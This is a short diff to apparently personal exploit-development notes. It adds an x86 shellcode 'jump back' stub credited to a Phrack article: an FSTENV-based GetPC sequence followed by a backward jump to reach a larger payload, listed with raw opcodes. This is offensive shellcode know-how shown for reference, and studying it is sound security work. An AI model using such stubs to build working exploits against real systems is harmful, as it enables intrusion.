@@ -77,3 +77,15 @@ JMP 00411363           # Jump to the command that was to be executed next
 83EC 58                     SUB ESP,58 
 FFE4                        JMP ESP
 ```
+
+# A Much Bigger Jump (400+ bytes), Phrack #62 Article 7 Originally written by Aaron Adams 
+```
+D9EE           FLDZ
+D97424 F4      FSTENV (28-BYTE) PTR SS:[ESP-C]
+59             POP ECX
+80C1 0A        ADD CL,0A
+90             NOP
+FECD           DEC CH
+FECD           DEC CH
+FFE1           JMP ECX
+```
